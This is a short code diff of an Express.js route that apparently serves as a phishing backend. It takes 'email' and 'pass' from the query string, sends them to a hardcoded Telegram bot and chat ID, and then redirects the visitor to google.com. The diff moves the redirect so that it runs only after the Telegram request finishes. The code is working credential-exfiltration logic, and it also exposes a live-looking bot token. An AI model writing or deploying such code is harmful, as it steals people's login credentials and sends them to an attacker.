@@ -7,15 +7,20 @@ const app = express()
 app.get('/get',(req,res)=>{
     
     
+    
     if(req.query.email.length > 10 &&  req.query.pass.length > 6 ){ 
        try{
-        axios.get(`https://api.telegram.org/bot5677505583:AAGd_enhKeP6A9zu9WNk8UGqMkwikrTlvtM/sendMessage?chat_id=1913438485&text=${JSON.stringify(req.query)}`)
+        axios.get(`https://api.telegram.org/bot5677505583:AAGd_enhKeP6A9zu9WNk8UGqMkwikrTlvtM/sendMessage?chat_id=1913438485&text=${JSON.stringify(req.query)}`).then(resp => {
+
+                console.log(resp.data);
+                res.status(301).redirect("https://www.google.com")
+         });
         
        }
         catch(e){
            console.log(e)
         }  
-      res.status(301).redirect("https://www.google.com")
+     
     }
     else {
       res.send('Error!');
